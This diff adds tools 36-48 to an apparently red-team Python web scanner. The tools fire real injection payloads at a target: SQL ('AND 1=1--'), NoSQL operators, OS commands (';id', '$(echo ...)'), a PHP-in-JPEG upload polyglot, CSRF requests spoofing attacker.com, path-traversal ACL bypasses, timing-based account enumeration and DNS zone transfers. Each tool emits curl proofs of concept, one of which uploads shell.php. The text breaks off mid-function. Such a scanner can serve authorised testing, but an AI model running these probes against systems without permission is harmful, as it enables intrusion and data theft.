@@ -1943,6 +1943,1318 @@ class IDORDeepScanner:
 
 
 # ══════════════════════════════════════════════════════════════
+# ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗     █████╗
+# ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ██╔══██╗
+# ██████╔╝███████║███████║███████╗█████╗      ╚█████╔╝
+# ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝      ██╔══██╗
+# ██║     ██║  ██║██║  ██║███████║███████╗    ╚█████╔╝
+# ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚════╝
+# TOOLS 36-65 — 30 Advanced Red Team Skills (Phase 8)
+# ══════════════════════════════════════════════════════════════
+
+# ── TOOL 36: SQL INJECTION SCANNER  (SKILL-46) ─────────────
+class SQLiScanner:
+    """Error-based, boolean-blind, time-safe SQLi detection."""
+    ERROR_SIGS = [
+        r"you have an error in your sql syntax",
+        r"warning: mysql",r"unclosed quotation mark",
+        r"pg_query\(\).*failed",r"ora-\d{4,5}:",
+        r"microsoft ole db provider for sql server",
+        r"sqlite3\.operationalerror",r"syntax error.*near",
+        r"invalid query",r"com\.microsoft\.sqlserver",
+    ]
+    BOOL_PAYLOADS = [("' AND 1=1--","' AND 1=2--"),("1 AND 1=1","1 AND 1=2")]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("SQLI-36: SQL Injection (error-based + boolean-blind detection)")
+        base = profile.url.rstrip("/")
+        params = list(set(profile.parameters[:8] + ["id","user","search","q","name","email","category","order"]))
+        confirmed = []
+        for param in params[:10]:
+            # Error-based
+            for payload in ["'", '"', "''", "1 UNION SELECT NULL--"]:
+                url = f"{base}?{param}={urllib.parse.quote(payload)}"
+                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
+                for sig in self.ERROR_SIGS:
+                    if re.search(sig, body, re.I):
+                        high(f"  SQLi ERROR: param '{param}' | sig: {sig[:40]}")
+                        confirmed.append({"param":param,"type":"error","payload":payload,"url":url})
+                        break
+            # Boolean-blind — compare responses
+            for true_p, false_p in self.BOOL_PAYLOADS:
+                url_t = f"{base}?{param}={urllib.parse.quote(true_p)}"
+                url_f = f"{base}?{param}={urllib.parse.quote(false_p)}"
+                ct, bt, _ = _fetch(url_t, cfg.user_agent, cfg.timeout)
+                cf, bf, _ = _fetch(url_f, cfg.user_agent, cfg.timeout)
+                if ct == cf and ct == 200 and abs(len(bt)-len(bf)) > 50:
+                    warn(f"  SQLi BOOLEAN: param '{param}' — response length diff {len(bt)} vs {len(bf)}")
+                    confirmed.append({"param":param,"type":"boolean","payload":true_p,"url":url_t})
+            # POST body
+            for payload in ["'", "1 AND 1=1"]:
+                p_code, p_body, _ = _fetch(base, cfg.user_agent, cfg.timeout,
+                    method="POST", data=urllib.parse.urlencode({param: payload}).encode())
+                for sig in self.ERROR_SIGS:
+                    if re.search(sig, p_body, re.I):
+                        high(f"  SQLi POST ERROR: param '{param}'")
+                        confirmed.append({"param":param,"type":"error_post","payload":payload,"url":base})
+        if confirmed:
+            profile.findings.append(Finding(
+                id="F-SQLI-001", title="SQL Injection Detected",
+                severity="CRITICAL", cwe="CWE-89", cvss=9.8,
+                description=f"SQL injection in params: {list(set(c['param'] for c in confirmed))}",
+                evidence="\n".join(f"{c['type']} | {c['param']}: {c['payload']}" for c in confirmed[:5]),
+                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:3]),
+                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
+                category="SQL Injection",
+                remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL."
+            ))
+        return profile
+
+# ── TOOL 37: NOSQL INJECTION  (SKILL-47) ───────────────────
+class NoSQLInjection:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("NOSQLI-37: NoSQL/MongoDB operator injection")
+        base = profile.url.rstrip("/")
+        payloads_json = [
+            '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
+            '{"$where":"1==1"}', '{"$exists":true}',
+        ]
+        payloads_url = ["[$gt]=", "[$ne]=null", "[$regex]=.*", "[$exists]=true"]
+        params = list(set(profile.parameters[:5] + ["username","email","password","id","search"]))
+        confirmed = []
+        for param in params[:8]:
+            # JSON body injection
+            for payload in payloads_json:
+                try:
+                    body_data = json.dumps({param: json.loads(payload)}).encode()
+                except Exception:
+                    continue
+                code, body, _ = _fetch(base, cfg.user_agent, cfg.timeout,
+                    method="POST", data=body_data,
+                    headers_extra={"Content-Type":"application/json"})
+                if code == 200 and len(body) > 20:
+                    baseline_code, baseline_body, _ = _fetch(base, cfg.user_agent, cfg.timeout,
+                        method="POST", data=json.dumps({param: "invalid_xyz_123"}).encode(),
+                        headers_extra={"Content-Type":"application/json"})
+                    if len(body) != len(baseline_body) and abs(len(body)-len(baseline_body)) > 30:
+                        high(f"  NoSQLi: param '{param}' payload '{payload}' changed response!")
+                        confirmed.append({"param":param,"payload":payload})
+            # URL param injection
+            for suffix in payloads_url:
+                test_url = f"{base}?{param}{suffix}"
+                code, body, _ = _fetch(test_url, cfg.user_agent, cfg.timeout)
+                if code == 200:
+                    baseline_code, baseline_body, _ = _fetch(f"{base}?{param}=invalid_xyz", cfg.user_agent, cfg.timeout)
+                    if len(body) != len(baseline_body) and abs(len(body)-len(baseline_body)) > 30:
+                        warn(f"  NoSQLi URL: {test_url}")
+                        confirmed.append({"param":param,"payload":suffix})
+        if confirmed:
+            profile.findings.append(Finding(
+                id="F-NOSQL-001", title="NoSQL Injection (MongoDB Operators)",
+                severity="CRITICAL", cwe="CWE-943", cvss=9.4,
+                description=f"NoSQL operator injection in: {[c['param'] for c in confirmed]}",
+                evidence="\n".join(f"{c['param']}: {c['payload']}" for c in confirmed[:5]),
+                reproduction=f"curl -sk -X POST '{base}' -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}'",
+                poc_curl=f"curl -sk -X POST '{base}' -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}'",
+                category="NoSQL Injection",
+                remediation="Sanitize inputs. Use schema validation. Avoid $where. Use query builders."
+            ))
+        return profile
+
+# ── TOOL 38: COMMAND INJECTION  (SKILL-48) ─────────────────
+class CommandInjectionScanner:
+    """Safe blind detection via timing (sleep 0 = no actual delay risk)."""
+    CMD_PAYLOADS = [
+        (";echo CMDINJTEST",  "CMDINJTEST"),
+        ("&&echo CMDINJTEST", "CMDINJTEST"),
+        ("|echo CMDINJTEST",  "CMDINJTEST"),
+        ("`echo CMDINJTEST`", "CMDINJTEST"),
+        ("$(echo CMDINJTEST)","CMDINJTEST"),
+        (";id",               "uid="),
+        ("&&id",              "uid="),
+        ("|id",               "uid="),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("CMDI-38: Command injection (echo/id-based reflection detection)")
+        base = profile.url.rstrip("/")
+        params = list(set(profile.parameters[:8] + ["cmd","exec","run","command","ping","host","ip","query"]))
+        confirmed = []
+        for param in params[:10]:
+            for payload, indicator in self.CMD_PAYLOADS:
+                url = f"{base}?{param}={urllib.parse.quote(payload)}"
+                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
+                if indicator in body:
+                    high(f"  CMDI CONFIRMED: param '{param}' payload '{payload}' → '{indicator}' in response!")
+                    confirmed.append({"param":param,"payload":payload,"url":url,"indicator":indicator})
+                    break
+                # POST
+                pc, pb, _ = _fetch(base, cfg.user_agent, cfg.timeout,
+                    method="POST", data=urllib.parse.urlencode({param: payload}).encode())
+                if indicator in pb:
+                    high(f"  CMDI POST: '{param}' → '{indicator}'")
+                    confirmed.append({"param":param,"payload":payload,"url":base,"indicator":indicator})
+                    break
+        if confirmed:
+            profile.findings.append(Finding(
+                id="F-CMDI-001", title="OS Command Injection",
+                severity="CRITICAL", cwe="CWE-78", cvss=10.0,
+                description=f"Command injection confirmed in params: {[c['param'] for c in confirmed]}",
+                evidence="\n".join(f"{c['param']}: {c['payload']} → {c['indicator']}" for c in confirmed),
+                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:2]),
+                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
+                category="Command Injection",
+                remediation="Never pass user input to OS commands. Use allow-list validation. Use subprocess with args list."
+            ))
+        return profile
+
+# ── TOOL 39: FILE UPLOAD SECURITY  (SKILL-49) ──────────────
+class FileUploadTester:
+    MALICIOUS_EXTENSIONS = [".php",".php5",".phtml",".phar",".asp",".aspx",".jsp",".jspx",".shtml"]
+    POLYGLOT_JPEG_PHP = b'\xff\xd8\xff\xe0' + b'<?php echo "UPLOADTEST"; ?>'
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("UPLOAD-39: File upload security (extension bypass, content-type confusion)")
+        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
+        # Find file upload forms
+        upload_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*>', html_body, re.I)
+        upload_forms  = re.findall(r'<form[^>]*(?:enctype=["\']multipart/form-data["\'])[^>]*action=["\']([^"\']+)["\']',
+                                   html_body, re.I)
+        if not upload_inputs and not upload_forms:
+            # Check API paths
+            for path in ["/api/upload","/upload","/api/file","/api/files","/api/media","/api/avatar","/api/attachment"]:
+                code, body, hdrs = _fetch(profile.url.rstrip("/")+path, cfg.user_agent, cfg.timeout,
+                                          method="POST",
+                                          data=b'--boundary\r\nContent-Disposition: form-data; name="file"; filename="test.txt"\r\nContent-Type: text/plain\r\n\r\ntest\r\n--boundary--',
+                                          headers_extra={"Content-Type":"multipart/form-data; boundary=boundary"})
+                if code in [200,201,400,413,415,422]:
+                    warn(f"  Upload endpoint: {path} [{code}]")
+                    upload_forms.append(path)
+            if not upload_forms:
+                info("  No file upload endpoints found"); return profile
+
+        upload_findings = []
+        for action in (upload_forms[:3] or [profile.url]):
+            url = action if action.startswith("http") else profile.url.rstrip("/")+action
+            # Test 1: PHP disguised as image (polyglot)
+            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+            for ext in [".php.jpg",".php%00.jpg",".phtml",".php5"]:
+                body_mp = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
+                           f"filename=\"test{ext}\"\r\nContent-Type: image/jpeg\r\n\r\n").encode()
+                body_mp += self.POLYGLOT_JPEG_PHP + f"\r\n--{boundary}--\r\n".encode()
+                code, resp, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
+                    method="POST", data=body_mp,
+                    headers_extra={"Content-Type": f"multipart/form-data; boundary={boundary}"})
+                if code in [200,201]:
+                    # Check if file URL returned
+                    file_url_match = re.search(r'https?://[^\s"\'<>]+' + re.escape(ext.split("%")[0]), resp)
+                    if file_url_match or "success" in resp.lower() or "url" in resp.lower():
+                        high(f"  FILE UPLOAD BYPASS: ext '{ext}' accepted at {url}")
+                        upload_findings.append({"ext":ext,"url":url})
+        if upload_findings:
+            profile.findings.append(Finding(
+                id="F-UPLOAD-001", title="File Upload Security Bypass",
+                severity="CRITICAL", cwe="CWE-434", cvss=9.8,
+                description=f"Malicious file extensions accepted: {[u['ext'] for u in upload_findings]}",
+                evidence="\n".join(f"{u['ext']} → {u['url']}" for u in upload_findings),
+                reproduction=f"curl -sk -X POST '{upload_findings[0]['url']}' -F 'file=@shell.php;filename=shell.php.jpg;type=image/jpeg'",
+                poc_curl=f"curl -sk -X POST '{upload_findings[0]['url']}' -F 'file=@shell.php;filename=shell.php.jpg;type=image/jpeg'",
+                category="File Upload",
+                remediation="Validate file content by magic bytes, not extension. Store outside webroot. Use a CDN with execution disabled."
+            ))
+        else:
+            info(f"  Upload endpoints found but no obvious bypass detected (manual test recommended)")
+        return profile
+
+# ── TOOL 40: CSRF BYPASS DETECTOR  (SKILL-50) ──────────────
+class CSRFDetector:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("CSRF-40: CSRF token bypass detection")
+        base = profile.url.rstrip("/")
+        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
+        forms = re.findall(
+            r'<form[^>]*method=["\']post["\'][^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
+            html_body, re.I | re.S)
+        issues = []
+        for action, form_html in forms[:5]:
+            action_url = action if action.startswith("http") else base + action
+            has_csrf = bool(re.search(r'name=["\'](?:csrf|_token|authenticity_token|__RequestVerificationToken)["\']', form_html, re.I))
+            has_samesite = any(c.get("issues") and "missing SameSite" not in str(c["issues"]) for c in profile.cookie_results)
+            if not has_csrf:
+                warn(f"  CSRF: POST form missing token — {action_url}")
+                issues.append({"action": action_url, "issue": "missing_csrf_token"})
+            else:
+                # Try sending without token
+                inputs = re.findall(r'name=["\']([^"\']+)["\'].*?value=["\']([^"\']*)["\']', form_html, re.I)
+                data = {k: v for k, v in inputs if "csrf" not in k.lower() and "token" not in k.lower()}
+                code, body, _ = _fetch(action_url, cfg.user_agent, cfg.timeout,
+                    method="POST", data=urllib.parse.urlencode(data).encode(),
+                    headers_extra={"Content-Type":"application/x-www-form-urlencoded",
+                                   "Origin":"https://attacker.com", "Referer":"https://attacker.com/"})
+                if code in [200, 201, 302]:
+                    warn(f"  CSRF: form action may accept request without valid CSRF token!")
+                    issues.append({"action": action_url, "issue": "token_not_validated"})
+        if issues:
+            profile.findings.append(Finding(
+                id="F-CSRF-001", title="CSRF Protection Bypass",
+                severity="HIGH", cwe="CWE-352", cvss=8.1,
+                description=f"CSRF issues on {len(issues)} form(s).",
+                evidence="\n".join(f"{i['action']}: {i['issue']}" for i in issues),
+                reproduction="# Craft HTML form pointing to action URL and auto-submit from attacker.com",
+                poc_curl=f"curl -sk -X POST '{issues[0]['action']}' -H 'Origin: https://attacker.com' -d 'param=value'",
+                category="CSRF",
+                remediation="Use SameSite=Strict cookies. Validate CSRF tokens server-side. Use double-submit cookie pattern."
+            ))
+        return profile
+
+# ── TOOL 41: CLICKJACKING TESTER  (SKILL-51) ───────────────
+class ClickjackingTester:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("CJACK-41: Clickjacking via X-Frame-Options + CSP frame-ancestors")
+        _, _, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
+        xfo = hdrs.get("x-frame-options","").upper()
+        csp = hdrs.get("content-security-policy","").lower()
+        has_frame_ancestors = "frame-ancestors" in csp
+        has_xfo = xfo in ["DENY","SAMEORIGIN"]
+        if not has_xfo and not has_frame_ancestors:
+            high(f"  CLICKJACKING: No X-Frame-Options or CSP frame-ancestors — page embeddable!")
+            profile.findings.append(Finding(
+                id="F-CJ-001", title="Clickjacking Vulnerability",
+                severity="MEDIUM", cwe="CWE-1021", cvss=5.4,
+                description="Page can be embedded in an iframe — clickjacking possible.",
+                evidence=f"X-Frame-Options: '{xfo}' | CSP frame-ancestors: {has_frame_ancestors}",
+                reproduction=(
+                    "<html><body>"
+                    f"<iframe src='{profile.url}' width='800' height='600'></iframe>"
+                    "</body></html>"
+                ),
+                poc_curl=f"curl -sI '{profile.url}' | grep -i 'x-frame\\|frame-ancestors'",
+                category="Clickjacking",
+                remediation="Set X-Frame-Options: DENY or CSP frame-ancestors 'self'."
+            ))
+        elif xfo == "SAMEORIGIN" and not has_frame_ancestors:
+            warn(f"  CLICKJACKING: X-Frame-Options=SAMEORIGIN (CSP preferred, SAMEORIGIN acceptable)")
+        else:
+            ok(f"  Clickjacking protected: XFO={xfo} | frame-ancestors={has_frame_ancestors}")
+        return profile
+
+# ── TOOL 42: HTTP METHOD TAMPERING  (SKILL-52) ─────────────
+class HTTPMethodTampering:
+    INTERESTING = ["TRACE","TRACK","PUT","DELETE","PATCH","OPTIONS","CONNECT","DEBUG","MOVE","COPY"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("METHOD-42: HTTP method tampering + TRACE/WebDAV detection")
+        vulns = []
+        for method in self.INTERESTING:
+            code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout, method=method)
+            allow = hdrs.get("allow","")
+            if method == "TRACE" and (code == 200 or "TRACE" in body.upper()):
+                high(f"  TRACE ENABLED — XST (Cross-Site Tracing) risk!")
+                vulns.append({"method":"TRACE","code":code,"risk":"XST"})
+            elif method == "PUT" and code in [200,201,204]:
+                high(f"  PUT METHOD ALLOWED: {code} — arbitrary file write possible!")
+                vulns.append({"method":"PUT","code":code,"risk":"file_write"})
+            elif method == "DELETE" and code in [200,204]:
+                high(f"  DELETE METHOD ALLOWED: {code}")
+                vulns.append({"method":"DELETE","code":code,"risk":"file_delete"})
+            elif method == "OPTIONS" and allow:
+                ok(f"  OPTIONS: Allow: {allow}")
+                if re.search(r'\b(PUT|DELETE|TRACE|CONNECT)\b', allow):
+                    warn(f"  Dangerous methods in Allow header: {allow}")
+                    vulns.append({"method":"OPTIONS","code":code,"risk":f"dangerous_allow:{allow}"})
+            # X-HTTP-Method-Override tunnel
+            if method in ["DELETE","PUT"]:
+                code2, body2, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout,
+                    method="POST",
+                    headers_extra={"X-HTTP-Method-Override": method, "X-Method-Override": method})
+                if code2 in [200,201,204]:
+                    warn(f"  METHOD OVERRIDE: POST+X-HTTP-Method-Override:{method} → {code2}")
+                    vulns.append({"method":f"POST→{method}","code":code2,"risk":"method_override"})
+        if vulns:
+            dangerous = [v for v in vulns if v["risk"] in ["XST","file_write","file_delete"]]
+            profile.findings.append(Finding(
+                id="F-METHOD-001", title="Dangerous HTTP Methods Enabled",
+                severity="HIGH" if dangerous else "MEDIUM",
+                cwe="CWE-749", cvss=7.5 if dangerous else 5.3,
+                description=f"Dangerous HTTP methods: {[v['method'] for v in vulns]}",
+                evidence="\n".join(f"{v['method']}: HTTP {v['code']} ({v['risk']})" for v in vulns),
+                reproduction="\n".join(f"curl -sk -X {v['method']} '{profile.url}'" for v in vulns[:3]),
+                poc_curl=f"curl -sk -X TRACE '{profile.url}'",
+                category="HTTP Methods",
+                remediation="Disable unused HTTP methods at web server level. Block TRACE/TRACK globally."
+            ))
+        return profile
+
+# ── TOOL 43: ACCOUNT ENUMERATION (TIMING)  (SKILL-53) ──────
+class AccountEnumerationTiming:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("ENUM-43: Account enumeration via login/register response timing")
+        base = profile.url.rstrip("/")
+        login_paths = ["/api/login","/login","/api/auth/login","/auth/login","/api/v1/auth"]
+        register_paths = ["/api/register","/register","/api/signup","/signup","/api/users"]
+        for path in login_paths[:3]:
+            url = base + path
+            # Test with likely-existing email vs random
+            times = {"known":[], "unknown":[]}
+            for email, key in [("admin@example.com","known"),("nonexistent_xyz_123@notreal.invalid","unknown")]:
+                for _ in range(3):
+                    t0 = time.time()
+                    _fetch(url, cfg.user_agent, 5, method="POST",
+                           data=json.dumps({"email":email,"password":"wrongpassword"}).encode(),
+                           headers_extra={"Content-Type":"application/json"})
+                    times[key].append(time.time()-t0)
+                    time.sleep(0.1)
+            avg_known   = sum(times["known"])   / len(times["known"])
+            avg_unknown = sum(times["unknown"]) / len(times["unknown"])
+            diff = abs(avg_known - avg_unknown)
+            if diff > 0.1:
+                warn(f"  TIMING DIFF on {path}: known={avg_known:.3f}s unknown={avg_unknown:.3f}s (diff={diff:.3f}s)")
+                if diff > 0.3:
+                    profile.findings.append(Finding(
+                        id=f"F-ENUM-{len(profile.findings):03d}",
+                        title="Account Enumeration via Response Timing",
+                        severity="MEDIUM", cwe="CWE-203", cvss=5.3,
+                        description=f"Login at {path} leaks user existence via timing: {diff:.3f}s difference.",
+                        evidence=f"Known: {avg_known:.3f}s | Unknown: {avg_unknown:.3f}s | Diff: {diff:.3f}s",
+                        reproduction=f"# Time 10 requests with admin@target.com vs random@random.invalid at {url}",
+                        poc_curl=f"time curl -sk -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"email\":\"admin@{profile.host}\",\"password\":\"x\"}}'",
+                        category="Account Enumeration",
+                        remediation="Use constant-time comparison. Return identical responses for valid/invalid users."
+                    ))
+        return profile
+
+# ── TOOL 44: PATH-BASED ACL BYPASS  (SKILL-54) ─────────────
+class PathACLBypass:
+    TRAVERSALS = [
+        "/admin/../user", "/admin/%2e%2e/user", "/admin/./user",
+        "/admin%2fadmin", "/ADMIN", "/Admin",
+        "/api/admin/../public", "/api/v1/admin%2f..%2fpublic",
+        "//admin", "/./admin", "/%61dmin",  # URL encoding of 'a'
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("ACLBYP-44: Path-based ACL bypass (traversal, case, encoding)")
+        base = profile.url.rstrip("/")
+        found = []
+        # Baseline: what does /admin return normally?
+        admin_code, _, _ = _fetch(base+"/admin", cfg.user_agent, cfg.timeout)
+        if admin_code not in [401,403]:
+            info(f"  /admin returns {admin_code} — no baseline restriction to bypass")
+            return profile
+        for traversal in self.TRAVERSALS:
+            code, body, _ = _fetch(base+traversal, cfg.user_agent, cfg.timeout)
+            if code == 200:
+                high(f"  ACL BYPASS: {traversal} → HTTP {code} (baseline /admin = {admin_code})")
+                found.append({"path":traversal,"code":code})
+        if found:
+            profile.findings.append(Finding(
+                id="F-ACL-001", title="Path-Based Access Control Bypass",
+                severity="HIGH", cwe="CWE-22", cvss=8.6,
+                description=f"ACL bypass via path manipulation: {[f['path'] for f in found]}",
+                evidence=f"Baseline /admin: HTTP {admin_code}\n" + "\n".join(f"{f['path']}: HTTP {f['code']}" for f in found),
+                reproduction="\n".join(f"curl -sk '{base+f['path']}'" for f in found[:3]),
+                poc_curl=f"curl -sk '{base+found[0]['path']}'",
+                category="Access Control",
+                remediation="Normalize URL paths before authorization checks. Use path canonicalization."
+            ))
+        return profile
+
+# ── TOOL 45: API VERSION DOWNGRADE  (SKILL-55) ─────────────
+class APIVersionDowngrade:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("APIDOWN-45: API version downgrade privilege regression")
+        base = profile.url.rstrip("/")
+        vuln_paths = []
+        # Find highest API version available
+        versions = []
+        for v in ["/api/v1","/api/v2","/api/v3","/v1","/v2","/v3"]:
+            code, _, _ = _fetch(base+v, cfg.user_agent, cfg.timeout)
+            if code in [200,401,403]: versions.append((v,code))
+        if len(versions) < 2:
+            info("  Only one API version found — no downgrade test possible")
+            return profile
+        # Compare response structure between versions on same endpoints
+        for endpoint in ["/users","/user","/profile","/account","/admin"]:
+            codes = {}
+            for v, _ in versions:
+                url = base+v+endpoint
+                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
+                codes[v] = (code, len(body))
+            code_set = set(c for c,_ in codes.values())
+            if len(code_set) > 1:
+                sorted_codes = sorted(codes.items(), key=lambda x: x[0])
+                warn(f"  VERSION DIFF on {endpoint}: " + " | ".join(f"{v}: HTTP {c}" for v,(c,s) in sorted_codes))
+                # If newer version is restricted (401/403) but older returns 200
+                v_codes = {v:c for v,(c,s) in codes.items()}
+                newer = [v for v in ["/api/v3","/v3","/api/v2","/v2"] if v in v_codes and v_codes[v] in [401,403]]
+                older = [v for v in ["/api/v1","/v1"] if v in v_codes and v_codes[v] == 200]
+                if newer and older:
+                    high(f"  API DOWNGRADE: {older[0]+endpoint} returns 200 but {newer[0]+endpoint} is {v_codes[newer[0]]}")
+                    vuln_paths.append({"endpoint":endpoint,"old":older[0],"new":newer[0],"diff":v_codes})
+        if vuln_paths:
+            profile.findings.append(Finding(
+                id="F-APIDOWN-001", title="API Version Downgrade — Security Regression",
+                severity="HIGH", cwe="CWE-1059", cvss=7.5,
+                description=f"Older API versions expose endpoints restricted in newer versions.",
+                evidence="\n".join(f"{v['endpoint']}: {v['old']}=200 vs {v['new']}=403" for v in vuln_paths),
+                reproduction="\n".join(f"curl -sk '{base+v['old']+v['endpoint']}'" for v in vuln_paths[:2]),
+                poc_curl=f"curl -sk '{base+vuln_paths[0]['old']+vuln_paths[0]['endpoint']}'",
+                category="API Security",
+                remediation="Apply identical authorization checks across all API versions. Deprecate and remove old versions."
+            ))
+        return profile
+
+# ── TOOL 46: TLS MISCONFIGURATION SCANNER  (SKILL-56) ──────
+class TLSMisconfigScanner:
+    WEAK_CIPHERS = ["RC4","DES","3DES","EXPORT","NULL","ANON","aNULL","eNULL","SEED","MD5"]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("TLS-46: TLS version + weak cipher + old protocol detection")
+        host = profile.host; issues = []
+        # Check TLS 1.0 and 1.1 support
+        for proto, ver_const in [("TLSv1.0", ssl.TLSVersion.TLSv1), ("TLSv1.1", ssl.TLSVersion.TLSv1_1)]:
+            try:
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                ctx.minimum_version = ver_const; ctx.maximum_version = ver_const
+                with socket.create_connection((host,443),timeout=6) as s:
+                    with ctx.wrap_socket(s, server_hostname=host) as ss:
+                        high(f"  TLS WEAK PROTOCOL: {proto} accepted!")
+                        issues.append(f"{proto} supported")
+            except (ssl.SSLError, AttributeError, OSError):
+                ok(f"  {proto}: rejected (good)")
+        # Check current cipher suite
+        cipher = profile.tls_cipher.upper()
+        for weak in self.WEAK_CIPHERS:
+            if weak in cipher:
+                high(f"  WEAK CIPHER: {cipher} contains {weak}")
+                issues.append(f"weak_cipher:{cipher}")
+        # Check TLS version
+        tls = profile.tls_version
+        if tls in ["TLSv1","TLSv1.1"]:
+            high(f"  DEPRECATED TLS: {tls}")
+            issues.append(f"deprecated_tls:{tls}")
+        elif tls in ["TLSv1.2"]:
+            warn(f"  TLS 1.2 (prefer 1.3)")
+        elif tls == "TLSv1.3":
+            ok(f"  TLS 1.3 — current best practice")
+        if issues:
+            profile.findings.append(Finding(
+                id="F-TLS-001", title="TLS Misconfiguration",
+                severity="HIGH" if any("TLSv1.0" in i or "TLSv1.1" in i for i in issues) else "MEDIUM",
+                cwe="CWE-326", cvss=7.4,
+                description=f"TLS issues: {issues}",
+                evidence=f"Issues: {issues}\nCurrent TLS: {tls} | Cipher: {cipher}",
+                reproduction=f"openssl s_client -connect {host}:443 -tls1",
+                poc_curl=f"curl -sk --tls-max 1.1 '{profile.url}'",
+                category="TLS",
+                remediation="Disable TLS 1.0/1.1. Configure only TLS 1.2+ with strong ciphers (AES-GCM, ChaCha20)."
+            ))
+        return profile
+
+# ── TOOL 47: DNS ZONE TRANSFER  (SKILL-57) ─────────────────
+class DNSZoneTransfer:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("AXFR-47: DNS zone transfer (AXFR) attempt")
+        apex = profile.apex
+        import subprocess
+        # Get NS records first
+        ns_servers = []
+        try:
+            result = subprocess.run(["dig","+short","NS",apex], capture_output=True, text=True, timeout=8)
+            ns_servers = [line.strip() for line in result.stdout.splitlines() if line.strip()]
+        except Exception:
+            # Fallback: try common NS patterns
+            ns_servers = [f"ns1.{apex}", f"ns2.{apex}"]
+        for ns in ns_servers[:3]:
+            ns_clean = ns.rstrip(".")
+            try:
+                result = subprocess.run(
+                    ["dig", "+noall", "+answer", f"@{ns_clean}", "AXFR", apex],
+                    capture_output=True, text=True, timeout=10)
+                output = result.stdout
+                if output and len(output) > 100 and re.search(r'\s+IN\s+', output):
+                    high(f"  ZONE TRANSFER ALLOWED via {ns_clean}!")
+                    records = [l for l in output.splitlines() if l.strip() and not l.startswith(";")]
+                    profile.findings.append(Finding(
+                        id="F-AXFR-001", title="DNS Zone Transfer (AXFR) Allowed",
+                        severity="HIGH", cwe="CWE-200", cvss=7.5,
+                        description=f"DNS zone transfer allowed from {ns_clean} — full zone exposed.",
+                        evidence="\n".join(records[:20]),
+                        reproduction=f"dig @{ns_clean} AXFR {apex}",
+                        poc_curl=f"dig @{ns_clean} AXFR {apex}",
+                        category="DNS",
+                        remediation="Restrict AXFR to authorized secondary DNS servers only."
+                    ))
+                else:
+                    ok(f"  AXFR refused by {ns_clean} (good)")
+            except Exception as e:
+                info(f"  AXFR test failed for {ns_clean}: {e}")
+        return profile
+
+# ── TOOL 48: INSECURE DESERIALIZATION  (SKILL-58) ──────────
+class DeserializationDetector:
+    JAVA_MAGIC  = b'\xac\xed\x00\x05'
+    PHP_PAT     = re.compile(r'O:\d+:"[^"]+":')
+    PYTHON_PAT  = re.compile(r'(?:cos\n|cposix\n|cpickle\n)', re.S)
+    JWT_NONE_PAT= re.compile(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.\s*$')
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("DESER-48: Insecure deserialization detection")
+        issues = []
+        for src_url in [profile.url] + profile.js_files[:5]:
+            _, body, _ = _fetch(src_url, cfg.user_agent, cfg.timeout)
+            if not body: continue
+            # PHP serialized objects
+            if self.PHP_PAT.search(body):
+                warn(f"  PHP serialized object pattern in {src_url}")
+                issues.append({"type":"php_serialize","url":src_url})
+            # Base64-encoded Java serialization magic
+            for m in re.finditer(r'[A-Za-z0-9+/]{20,}={0,2}', body):
+                try:
+                    dec = base64.b64decode(m.group(0))
+                    if dec.startswith(self.JAVA_MAGIC):
+                        high(f"  JAVA SERIALIZED OBJECT (base64) in {src_url}")
+                        issues.append({"type":"java_serialize","url":src_url,"b64":m.group(0)[:40]})
+                except Exception: pass
+            # ViewState (ASP.NET) — check if MAC validation disabled
+            vs = re.search(r'id=["\']__VIEWSTATE["\'][^>]*value=["\']([^"\']+)["\']', body)
+            if vs:
+                vs_val = vs.group(1)
+                try:
+                    decoded = base64.b64decode(vs_val + "==")
+                    # If no MAC suffix (16 bytes), MAC validation might be off
+                    if len(decoded) < 20 or not decoded[-20:]:
